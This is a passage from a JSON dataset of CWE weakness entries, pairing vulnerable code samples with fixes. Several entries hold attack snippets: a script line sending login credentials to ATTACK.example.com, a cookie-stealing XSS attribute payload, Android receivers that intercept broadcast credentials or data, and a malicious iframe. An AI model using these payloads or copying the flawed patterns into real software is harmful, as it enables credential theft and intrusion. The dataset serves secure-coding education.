        "demonstrative_examples": "Example 1 This login webpage includes a weather widget from an external website: (bad code) Example Language: HTML <div class=\"header\"> Welcome! <div id=\"loginBox\">Please Login: <form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\"> Username: <input type=\"text\" name=\"username\" /> <br/> Password: <input type=\"password\" name=\"password\" /> <input type=\"submit\" value=\"Login\" /> </form> </div> <div id=\"WeatherWidget\"> <script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script> </div> </div> This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness ( CWE-79 ). For example, user login information could easily be stolen with a single line added to weatherwidget.js: (attack code) Example Language: JavaScript ...Weather widget code.... document.getElementById(\\'loginForm\\').action = \"ATTACK.example.com/stealPassword.php\"; \"This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.\""
    },
    {
        "id": 830,
        "demonstrative_examples": "Example 1 This login webpage includes a weather widget from an external website: (bad code) Example Language: HTML <div class=\"header\"> Welcome! <div id=\"loginBox\">Please Login: <form id =\"loginForm\" name=\"loginForm\" action=\"login.php\" method=\"post\"> Username: <input type=\"text\" name=\"username\" /> <br/> Password: <input type=\"password\" name=\"password\" /> <input type=\"submit\" value=\"Login\" /> </form> </div> <div id=\"WeatherWidget\"> <script type=\"text/javascript\" src=\"externalDomain.example.com/weatherwidget.js\"></script> </div> </div> This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness ( CWE-79 ). For example, user login information could easily be stolen with a single line added to weatherwidget.js: (attack code) Example Language: JavaScript ...Weather widget code.... document.getElementById(\\'loginForm\\').action = \"ATTACK.example.com/stealPassword.php\"; \"This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.\""
    },
    {
        "id": 831,
        "demonstrative_examples": "Example 1 This code registers the same signal handler function with two different signals. (bad code) Example Language: C void handler (int sigNum) { ... } int main (int argc, char* argv[]) { signal(SIGUSR1, handler) signal(SIGUSR2, handler) } Example 2 This code registers the same signal handler function with two different signals ( CWE-831 ). If those signals are sent to the process, the handler creates a log message (specified in the first argument to the program) and exits. (bad code) Example Language: C char *logMessage; void handler (int sigNum) { syslog(LOG_NOTICE, \"%s\\\\n\", logMessage); free(logMessage); /* artificially increase the size of the timing window to make demonstration of this weakness easier. */ sleep(10); exit(0); } int main (int argc, char* argv[]) { logMessage = strdup(argv[1]); /* Register signal handlers. */ signal(SIGHUP, handler); signal(SIGTERM, handler); /* artificially increase the size of the timing window to make demonstration of this weakness easier. */ sleep(10); } The handler function uses global state (globalVar and logMessage), and it can be called by both the SIGHUP and SIGTERM signals. An attack scenario might follow these lines: The program begins execution, initializes logMessage, and registers the signal handlers for SIGHUP and SIGTERM. The program begins its \"normal\" functionality, which is simplified as sleep(), but could be any functionality that consumes some time. The attacker sends SIGHUP, which invokes handler (call this \"SIGHUP-handler\"). SIGHUP-handler begins to execute, calling syslog(). syslog() calls malloc(), which is non-reentrant. malloc() begins to modify metadata to manage the heap. The attacker then sends SIGTERM. \"SIGHUP-handler is interrupted, but syslog's malloc call is still executing and has not finished modifying its metadata.\" The SIGTERM handler is invoked. SIGTERM-handler records the log message using syslog(), then frees the logMessage variable. At this point, the state of the heap is uncertain, because malloc is still modifying the metadata for the heap; the metadata might be in an inconsistent state. The SIGTERM-handler call to free() is assuming that the metadata is inconsistent, possibly causing it to write data to the wrong location while managing the heap. The result is memory corruption, which could lead to a crash or even code execution, depending on the circumstances under which the code is running. Note that this is an adaptation of a classic example as originally presented by Michal Zalewski [ REF-360 ]; the original example was shown to be exploitable for code execution. Also note that the strdup(argv[1]) call contains a potential buffer over-read ( CWE-126 ) if the program is called without any arguments, because argc would be 0, and argv[1] would point outside the bounds of the array."
    },
    {
        "id": 832,
        "demonstrative_examples": ""
    },
    {
        "id": 833,
        "demonstrative_examples": ""
    },
    {
        "id": 834,
        "demonstrative_examples": ""
    },
    {
        "id": 835,
        "demonstrative_examples": "Example 1 In the following code the method processMessagesFromServer attempts to establish a connection to a server and read and process messages from the server. The method uses a do/while loop to continue trying to establish the connection to the server when an attempt fails. (bad code) Example Language: C int processMessagesFromServer(char *hostaddr, int port) { ... int servsock; int connected; struct sockaddr_in servaddr; // create socket to connect to server servsock = socket( AF_INET, SOCK_STREAM, 0); memset( &servaddr, 0, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_port = htons(port); servaddr.sin_addr.s_addr = inet_addr(hostaddr); do { // establish connection to server connected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr)); // if connected then read and process messages from server if (connected > -1) { // read and process messages ... } // keep trying to establish connection to the server } while (connected < 0); // close socket and return success or failure ... } However, this will create an infinite loop if the server does not respond. This infinite loop will consume system resources and can be used to create a denial of service attack. To resolve this a counter should be used to limit the number of attempts to establish a connection to the server, as in the following code. (good code) Example Language: C int processMessagesFromServer(char *hostaddr, int port) { ... // initialize number of attempts counter int count = 0; do { // establish connection to server connected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr)); // increment counter count++; // if connected then read and process messages from server if (connected > -1) { // read and process messages ... } // keep trying to establish connection to the server // up to a maximum number of attempts } while (connected < 0 && count < MAX_ATTEMPTS); // close socket and return success or failure ... } Example 2 For this example the method isReorderNeeded as part of a bookstore application that determines if a particular book needs to be reordered based on the current inventory count and the rate at which the book is being sold. (bad code) Example Language: Java public boolean isReorderNeeded(String bookISBN, int rateSold) { boolean isReorder = false; int minimumCount = 10; int days = 0; // get inventory count for book int inventoryCount = inventory.getIventoryCount(bookISBN); // find number of days until inventory count reaches minimum while (inventoryCount > minimumCount) { inventoryCount = inventoryCount - rateSold; days++; } // if number of days within reorder timeframe // set reorder return boolean to true if (days > 0 && days < 5) { isReorder = true; } return isReorder; } However, the while loop will become an infinite loop if the rateSold input parameter has a value of zero since the inventoryCount will never fall below the minimumCount. In this case the input parameter should be validated to ensure that a value of zero does not cause an infinite loop,as in the following code. (good code) Example Language: Java public boolean isReorderNeeded(String bookISBN, int rateSold) { ... // validate rateSold variable if (rateSold < 1) { return isReorder; } ... }"
    },
    {
        "id": 836,
        "demonstrative_examples": ""
    },
    {
        "id": 837,
        "demonstrative_examples": ""
    },
    {
        "id": 838,
        "demonstrative_examples": "Example 1 This code dynamically builds an HTML page using POST data: (bad code) Example Language: PHP \"$username = $_POST['username'];\" \"$picSource = $_POST['picsource'];\" \"$picAltText = $_POST['picalttext'];\" ... echo \"<title>Welcome, \" . htmlentities($username) .\"</title>\"; echo \"<img src=\\'\". htmlentities($picSource) .\" \\' alt=\\'\". htmlentities($picAltText) . \\'\" />\\'; ... The programmer attempts to avoid XSS exploits ( CWE-79 ) by encoding the POST values so they will not be interpreted as valid HTML. However, the htmlentities() encoding is not appropriate when the data are used as HTML attributes, allowing more attributes to be injected. For example, an attacker can set picAltText to: (attack code) \"altTextHere\\' onload=\\'alert(document.cookie)\" This will result in the generated HTML image tag: (result) Example Language: HTML \"<img src='pic.jpg' alt='altTextHere' onload='alert(document.cookie)' />\" The attacker can inject arbitrary javascript into the tag due to this incorrect encoding."
    },
    {
        "id": 839,
        "demonstrative_examples": "Example 1 The following code is intended to read an incoming packet from a socket and extract one or more headers. (bad code) Example Language: C DataPacket *packet; int numHeaders; PacketHeader *headers; sock=AcceptSocketConnection(); ReadPacket(packet, sock); numHeaders =packet->headers; if (numHeaders > 100) { ExitError(\"too many headers!\"); } headers = malloc(numHeaders * sizeof(PacketHeader); ParsePacketHeaders(packet, headers); The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory ( CWE-195 ). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow. Example 2 The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of \"short s\" is forced in this particular example, short int\\'s are frequently used within real-world code, such as code that processes structured data. (bad code) Example Language: C int GetUntrustedInt () { return(0x0000FFFF); } void main (int argc, char **argv) { char path[256]; char *input; int i; short s; unsigned int sz; i = GetUntrustedInt(); s = i; /* s is -1 so it passes the safety check - CWE-697 */ if (s > 256) { DiePainfully(\"go away!\\\\n\"); } /* s is sign-extended and saved in sz */ sz = s; /* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */ printf(\"i=%d, s=%d, sz=%u\\\\n\", i, s, sz); input = GetUserInput(\"Enter pathname:\"); \"/* strncpy interprets s as unsigned int, so it's treated as MAX_INT\" ( CWE-195 ), enabling buffer overflow ( CWE-119 ) */ strncpy(path, input, s); \"path[255] = '\\\\0'; /* don't want\" CWE-170 */ printf(\"Path is: %s\\\\n\", path); } This code first exhibits an example of CWE-839 , allowing \"s\" to be a negative number. When the negative short \"s\" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow ( CWE-119 ). Example 3 In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method (bad code) Example Language: C int getValueFromArray(int *array, int len, int index) { int value; // check that the array index is less than the maximum // length of the array if (index < len) { // get the value at the specified index of the array value = array[index]; } // if array index is invalid then output error message // and return value indicating error else { printf(\"Value is: %d\\\\n\", array[index]); value = -1; } return value; } However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value ( CWE-839 ). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read ( CWE-125 ) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array ( CWE-129 ). In this example the if statement should be modified to include a minimum range check, as shown below. (good code) Example Language: C ... // check that the array index is within the correct // range of values for the array if (index >= 0 && index < len) { ... Example 4 The following code shows a simple BankAccount class with deposit and withdraw methods. (bad code) Example Language: Java public class BankAccount { public final int MAXIMUM_WITHDRAWAL_LIMIT = 350; // variable for bank account balance private double accountBalance; // constructor for BankAccount public BankAccount() { accountBalance = 0; } // method to deposit amount into BankAccount public void deposit(double depositAmount) {...} // method to withdraw amount from BankAccount public void withdraw(double withdrawAmount) { if (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT) { double newBalance = accountBalance - withdrawAmount; accountBalance = newBalance; } else { System.err.println(\"Withdrawal amount exceeds the maximum limit allowed, please try again...\"); ... } } // other methods for accessing the BankAccount object ... } The withdraw method includes a check to ensure that the withdrawal amount does not exceed the maximum limit allowed, however the method does not check to ensure that the withdrawal amount is greater than a minimum value ( CWE-129 ). Performing a range check on a value that does not include a minimum check can have significant security implications, in this case not including a minimum range check can allow a negative value to be used which would cause the financial application using this class to deposit money into the user account rather than withdrawing. In this example the if statement should the modified to include a minimum range check, as shown below. (good code) Example Language: Java public class BankAccount { public final int MINIMUM_WITHDRAWAL_LIMIT = 0; public final int MAXIMUM_WITHDRAWAL_LIMIT = 350; ... // method to withdraw amount from BankAccount public void withdraw(double withdrawAmount) { if (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT && withdrawAmount > MINIMUM_WITHDRAWAL_LIMIT) { ... Note that this example does not protect against concurrent access to the BankAccount balance variable, see CWE-413 and CWE-362 . While it is out of scope for this example, note that the use of doubles or floats in financial calculations may be subject to certain kinds of attacks where attackers use rounding errors to steal money."
    },
    {
        "id": 841,
        "demonstrative_examples": "Example 1 This code is part of an FTP server and deals with various commands that could be sent by a user. It is intended that a user must successfully login before performing any other action such as retrieving or listing files. (bad code) Example Language: Python def dispatchCommand(command, user, args): \"if command == 'Login':\" loginUser(args) return # user has requested a file \"if command == 'Retrieve_file':\" if authenticated(user) and ownsFile(user,args): sendFile(args) return \"if command == 'List_files':\" listFiles(args) return ... \"The server correctly does not send files to a user that isn't logged in and doesnt own the file. However, the server will incorrectly list the files in any directory without confirming the command came from an authenticated user, and that the user is authorized to see the directory's contents.\" Here is a fixed version of the above example: (good code) Example Language: Python def dispatchCommand(command, user, args): ... \"if command == 'List_files':\" if authenticated(user) and ownsDirectory(user,args): listFiles(args) return ..."
    },
    {
        "id": 842,
        "demonstrative_examples": ""
    },
    {
        "id": 843,
        "demonstrative_examples": "Example 1 The following code uses a union to support the representation of different types of messages. It formats messages differently, depending on their type. (bad code) Example Language: C #define NAME_TYPE 1 #define ID_TYPE 2 struct MessageBuffer { int msgType; union { char *name; int nameID; }; }; int main (int argc, char **argv) { struct MessageBuffer buf; char *defaultMessage = \"Hello World\"; buf.msgType = NAME_TYPE; buf.name = defaultMessage; printf(\"Pointer of buf.name is %p\\\\n\", buf.name); /* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */ buf.nameID = (int)(defaultMessage + 1); printf(\"Pointer of buf.name is now %p\\\\n\", buf.name); if (buf.msgType == NAME_TYPE) { printf(\"Message: %s\\\\n\", buf.name); } else { printf(\"Message: Use ID %d\\\\n\", buf.nameID); } } The code intends to process the message as a NAME_TYPE, and sets the default message to \"Hello World.\" However, since both buf.name and buf.nameID are part of the same union, they can act as aliases for the same memory location, depending on memory layout after compilation. As a result, modification of buf.nameID - an int - can effectively modify the pointer that is stored in buf.name - a string. Execution of the program might generate output such as: Pointer of name is 10830 Pointer of name is now 10831 Message: ello World Notice how the pointer for buf.name was changed, even though buf.name was not explicitly modified. In this case, the first \"H\" character of the message is omitted. However, if an attacker is able to fully control the value of buf.nameID, then buf.name could contain an arbitrary pointer, leading to out-of-bounds reads or writes. Example 2 The following PHP code accepts a value, adds 5, and prints the sum. (bad code) Example Language: PHP \"$value = $_GET['value'];\" $sum = $value + 5; echo \"value parameter is \\'$value\\'<p>\"; echo \"SUM is $sum\"; When called with the following query string: value=123 the program calculates the sum and prints out: SUM is 128 However, the attacker could supply a query string such as: value[]=123 The \"[]\" array syntax causes $value to be treated as an array type, which then generates a fatal error when calculating $sum: Fatal error: Unsupported operand types in program.php on line 2 Example 3 \"The following Perl code is intended to look up the privileges for user ID's between 0 and 3, by performing an access of the $UserPrivilegeArray reference. It is expected that only userID 3 is an admin (since this is listed in the third element of the array).\" (bad code) Example Language: Perl my $UserPrivilegeArray = [\"user\", \"user\", \"admin\", \"user\"]; my $userID = get_current_user_ID(); if ($UserPrivilegeArray eq \"user\") { print \"Regular user!\\\\n\"; } else { print \"Admin!\\\\n\"; } print \"\\\\$UserPrivilegeArray = $UserPrivilegeArray\\\\n\"; In this case, the programmer intended to use \"$UserPrivilegeArray->{$userID}\" to access the proper position in the array. But because the subscript was omitted, the \"user\" string was compared to the scalar representation of the $UserPrivilegeArray reference, which might be of the form \"ARRAY(0x229e8)\" or similar. Since the logic also \"fails open\" ( CWE-636 ), the result of this bug is that all users are assigned administrator privileges. While this is a forced example, it demonstrates how type confusion can have security consequences, even in memory-safe languages."
    },
    {
        "id": 862,
        "demonstrative_examples": "Example 1 This function runs an arbitrary SQL query on a given database, returning the result of the query. (bad code) Example Language: PHP function runEmployeeQuery($dbName, $name){ mysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName); //Use a prepared statement to avoid CWE-89 \"$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');\" \"$preparedStatement->execute(array(':name' => $name));\" return $preparedStatement->fetchAll(); } /.../ \"$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);\" While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database. Example 2 The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory. (bad code) Example Language: Perl sub DisplayPrivateMessage { my($id) = @_; my $Message = LookupMessageObject($id); print \"From: \" . encodeHTML($Message->{from}) . \"<br>\\\\n\"; print \"Subject: \" . encodeHTML($Message->{subject}) . \"\\\\n\"; print \"<hr>\\\\n\"; print \"Body: \" . encodeHTML($Message->{body}) . \"\\\\n\"; } my $q = new CGI; # For purposes of this example, assume that CWE-309 and # CWE-523 do not apply. \"if (! AuthenticateUser($q->param('username'), $q->param('password'))) {\" ExitError(\"invalid username or password\"); } \"my $id = $q->param('id');\" DisplayPrivateMessage($id); While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users. One way to avoid this problem would be to ensure that the \"to\" field in the message object matches the username of the authenticated user."
    },
    {
        "id": 863,
        "demonstrative_examples": "Example 1 \"The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.\" (bad code) Example Language: PHP \"$role = $_COOKIES['role'];\" if (!$role) { \"$role = getRole('user');\" if ($role) { // save the cookie to send out in future responses setcookie(\"role\", $role, time()+60*60*2); } else{ ShowLoginScreen(); die(\"\\\\n\"); } } \"if ($role == 'Reader') {\" \"DisplayMedicalHistory($_POST['patient_ID']);\" } else{ die(\"You are not Authorized to view this record\\\\n\"); } The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the \"role\" cookie to the value \"Reader\". As a result, the $role variable is \"Reader\", and getRole() is never invoked. The attacker has bypassed the authorization system."
    },
    {
        "id": 908,
        "demonstrative_examples": "Example 1 Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached. (bad code) Example Language: Java private boolean initialized = true; public void someMethod() { if (!initialized) { // perform initialization tasks ... initialized = true; } Example 2 The following code intends to limit certain operations to the administrator only. (bad code) Example Language: Perl $username = GetCurrentUser(); $state = GetStateData($username); if (defined($state)) { $uid = ExtractUserID($state); } # do stuff if ($uid == 0) { DoAdminThings(); } If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident. Example 3 The following code intends to concatenate a string to a variable and print the string. (bad code) Example Language: C char str[20]; strcat(str, \"hello world\"); printf(\"%s\", str); This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory. If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244 ). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found. \"If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (\" CWE-126 \") if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.\" Example 4 This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized ( CWE-456 ). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address. (bad code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings ( CWE-457 ). To fix this code, there are a couple approaches to\\n\\t\\t\\t  making sure that test_string has been properly set once\\n\\t\\t\\t  it reaches the printf(). One solution would be to set test_string to an\\n\\t\\t\\t  acceptable default before the conditional: (good code) Example Language: C char *test_string = \"Done at the beginning\"; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); Another solution is to ensure that each\\n\\t\\t\\t  branch of the conditional - including the default/else\\n\\t\\t\\t  branch - could ensure that test_string is set: (good code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } else { test_string = \"Done on the other side!\"; } printf(\"%s\", test_string);"
    },
    {
        "id": 909,
        "demonstrative_examples": "Example 1 Here, a boolean initiailized field is consulted to ensure that initialization tasks are only completed once. However, the field is mistakenly set to true during static initialization, so the initialization code is never reached. (bad code) Example Language: Java private boolean initialized = true; public void someMethod() { if (!initialized) { // perform initialization tasks ... initialized = true; } Example 2 The following code intends to limit certain operations to the administrator only. (bad code) Example Language: Perl $username = GetCurrentUser(); $state = GetStateData($username); if (defined($state)) { $uid = ExtractUserID($state); } # do stuff if ($uid == 0) { DoAdminThings(); } If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident. Example 3 The following code intends to concatenate a string to a variable and print the string. (bad code) Example Language: C char str[20]; strcat(str, \"hello world\"); printf(\"%s\", str); This might seem innocent enough, but str was not initialized, so it contains random memory. As a result, str[0] might not contain the null terminator, so the copy might start at an offset other than 0. The consequences can vary, depending on the underlying memory. If a null terminator is found before str[8], then some bytes of random garbage will be printed before the \"hello world\" string. The memory might contain sensitive information from previous uses, such as a password (which might occur as a result of CWE-14 or CWE-244 ). In this example, it might not be a big deal, but consider what could happen if large amounts of memory are printed out before the null terminator is found. \"If a null terminator isn't found before str[8], then a buffer overflow could occur, since strcat will first look for the null terminator, then copy 12 bytes starting with that location. Alternately, a buffer over-read might occur (\" CWE-126 \") if a null terminator isn't found before the end of the memory segment is reached, leading to a segmentation fault and crash.\" Example 4 This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized ( CWE-456 ). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address. (bad code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings ( CWE-457 ). To fix this code, there are a couple approaches to\\n\\t\\t\\t  making sure that test_string has been properly set once\\n\\t\\t\\t  it reaches the printf(). One solution would be to set test_string to an\\n\\t\\t\\t  acceptable default before the conditional: (good code) Example Language: C char *test_string = \"Done at the beginning\"; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); Another solution is to ensure that each\\n\\t\\t\\t  branch of the conditional - including the default/else\\n\\t\\t\\t  branch - could ensure that test_string is set: (good code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } else { test_string = \"Done on the other side!\"; } printf(\"%s\", test_string);"
    },
    {
        "id": 910,
        "demonstrative_examples": ""
    },
    {
        "id": 911,
        "demonstrative_examples": ""
    },
    {
        "id": 912,
        "demonstrative_examples": ""
    },
    {
        "id": 913,
        "demonstrative_examples": ""
    },
    {
        "id": 914,
        "demonstrative_examples": "Example 1 This code uses the credentials sent in a POST request to login a user. (bad code) Example Language: PHP //Log user in, and set $isAdmin to true if user is an administrator function login($user,$pass){ $query = buildQuery($user,$pass); mysql_query($query); if(getUserRole($user) == \"Admin\"){ $isAdmin = true; } } $isAdmin = false; extract($_POST); login(mysql_real_escape_string($user),mysql_real_escape_string($pass)); The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value \"isAdmin\" equal to \"true\", thus gaining Admin privileges."
    },
    {
        "id": 915,
        "demonstrative_examples": ""
    },
    {
        "id": 916,
        "demonstrative_examples": ""
    },
    {
        "id": 917,
        "demonstrative_examples": ""
    },
    {
        "id": 918,
        "demonstrative_examples": ""
    },
    {
        "id": 920,
        "demonstrative_examples": ""
    },
    {
        "id": 921,
        "demonstrative_examples": ""
    },
    {
        "id": 922,
        "demonstrative_examples": ""
    },
    {
        "id": 923,
        "demonstrative_examples": ""
    },
    {
        "id": 924,
        "demonstrative_examples": ""
    },
    {
        "id": 925,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: XML <manifest package=\"com.example.vulnerableApplication\"> <application> ... <receiver android:name=\".ShutdownReceiver\"> <intent-filter> <action android:name=\"android.intent.action.ACTION_SHUTDOWN\" /> </intent-filter> </receiver> ... </application> </manifest> The ShutdownReceiver class will handle the intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(Intent.ACTION_SHUTDOWN); BroadcastReceiver sReceiver = new ShutDownReceiver(); registerReceiver(sReceiver, filter); ... public class ShutdownReceiver extends BroadcastReceiver { @Override public void onReceive(final Context context, final Intent intent) { mainActivity.saveLocalData(); mainActivity.stopActivity(); } } Because the method does not confirm that the intent action is the expected system intent, any received intent will trigger the shutdown procedure, as shown here: (attack code) Example Language: Java window.location = examplescheme://method?parameter=value An attacker can use this behavior to cause a denial of service."
    },
    {
        "id": 926,
        "demonstrative_examples": "Example 1 This application is exporting an activity and a service in its manifest.xml: (bad code) Example Language: XML <activity android:name=\"com.example.vulnerableApp.mainScreen\"> ... <intent-filter> <action android:name=\"com.example.vulnerableApp.OPEN_UI\" /> <category android:name=\"android.intent.category.DEFAULT\" /> </intent-filter> ... </activity> <service android:name=\"com.example.vulnerableApp.backgroundService\"> ... <intent-filter> <action android:name=\"com.example.vulnerableApp.START_BACKGROUND\" /> </intent-filter> ... </service> \"Because these components have intent filters but have not explicitly set 'android:exported=false' elsewhere in the manifest, they are automatically exported so that any other application can launch them. This may lead to unintended behavior or exploits.\" Example 2 This application has created a content provider to enable custom search suggestions within the application: (bad code) Example Language: XML <provider> android:name=\"com.example.vulnerableApp.searchDB\" android:authorities=\"com.example.vulnerableApp.searchDB\"> </provider> Because this content provider is only intended to be used within the application, it does not need to be exported. However, in Android before 4.2, it is automatically exported thus potentially allowing malicious applications to access sensitive information."
    },
    {
        "id": 927,
        "demonstrative_examples": "Example 1 This application wants to create a user account in several trusted applications using one broadcast intent: (bad code) Example Language: Java Intent intent = new Intent(); intent.setAction(\"com.example.CreateUser\"); intent.putExtra(\"Username\", uname_string); intent.putExtra(\"Password\", pw_string); sendBroadcast(intent); \"This application assumes only the trusted applications will be listening for the action. A malicious application can register for this action and intercept the user's login information, as below:\" (attack code) Example Language: Java IntentFilter filter = new IntentFilter(\"com.example.CreateUser\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); \"When a broadcast contains sensitive information, create an allowlist of applications that can receive the action using the application's manifest file, or programmatically send the intent to each individual intended receiver.\" Example 2 This application interfaces with a web service that requires a separate user login. It creates a sticky intent, so that future trusted applications that also use the web service will know who the current user is: (bad code) Example Language: Java Intent intent = new Intent(); intent.setAction(\"com.example.service.UserExists\"); intent.putExtra(\"Username\", uname_string); sendStickyBroadcast(intent); (attack code) Example Language: Java IntentFilter filter = new IntentFilter(\"com.example.service.UserExists\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); Sticky broadcasts can be read by any application at any time, and so should never contain sensitive information such as a username. Example 3 This application is sending an ordered broadcast, asking other applications to open a URL: (bad code) Example Language: Java Intent intent = new Intent(); intent.setAction(\"com.example.OpenURL\"); intent.putExtra(\"URL_TO_OPEN\", url_string); sendOrderedBroadcastAsUser(intent); Any application in the broadcast chain may alter the data within the intent. This malicious application is altering the URL to point to an attack site: (attack code) Example Language: Java public class CallReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { String Url = intent.getStringExtra(Intent.URL_TO_OPEN); attackURL = \"www.example.com/attack?\" + Url; setResultData(attackURL); } } The final receiving application will then open the attack URL. Where possible, send intents to specific trusted applications instead of using a broadcast chain. Example 4 This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes. (bad code) Example Language: Java Intent intent = new Intent(); intent.setAction(\"com.example.BackupUserData\"); intent.setData(file_uri); intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION); sendBroadcast(intent); (attack code) Example Language: Java public class CallReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { Uri userData = intent.getData(); stealUserData(userData); } } \"Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.\""
    },
    {
        "id": 939,
        "demonstrative_examples": "Example 1 This iOS application uses a custom URL scheme. The replaceFileText action in the URL scheme allows an external application to interface with the file incomingMessage.txt and replace the contents with the text field of the query string. External Application (good code) Example Language: Objective-C NSString *stringURL = @\"appscheme://replaceFileText?file=incomingMessage.txt&text=hello\"; NSURL *url = [NSURL URLWithString:stringURL]; [[UIApplication sharedApplication] openURL:url]; Application URL Handler (bad code) - (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url { if (!url) { return NO; } NSString *action = [url host]; if([action isEqualToString: @\"replaceFileText\"]) { NSDictionary *dict = [self parseQueryStringExampleFunction:[url query]]; //this function will write contents to a specified file FileObject *objectFile = [self writeToFile:[dict objectForKey: @\"file\"] withText:[dict objectForKey: @\"text\"]]; } return YES; } The handler has no restriction on who can use its functionality. The handler can be invoked using any method that invokes the URL handler such as the following malicious iframe embedded on a web page opened by Safari. (attack code) Example Language: HTML <iframe src=\"appscheme://replaceFileText?file=Bookmarks.dat&text=listOfMaliciousWebsites\"> The attacker can host a malicious website containing the iframe and trick users into going to the site via a crafted phishing email. Since Safari automatically executes iframes, the user is not prompted when the handler executes the iframe code which automatically invokes the URL handler replacing the bookmarks file with a list of malicious websites. Since replaceFileText is a potentially dangerous action, an action that modifies data, there should be a sanity check before the writeToFile:withText: function. Example 2 These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the 